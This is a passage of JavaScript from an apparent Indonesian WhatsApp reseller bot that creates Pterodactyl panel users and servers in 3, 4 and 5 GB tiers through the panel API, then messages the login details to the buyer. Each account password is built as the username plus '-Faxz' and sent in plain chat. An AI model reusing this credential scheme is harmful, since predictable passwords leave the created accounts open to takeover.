const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "3090"
let cpu = "90"
let disk = "3090"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "4gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "4110"
let cpu = "120"
let disk = "4110"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙* 

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "5130"
let cpu = "150"
let disk = "5130"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

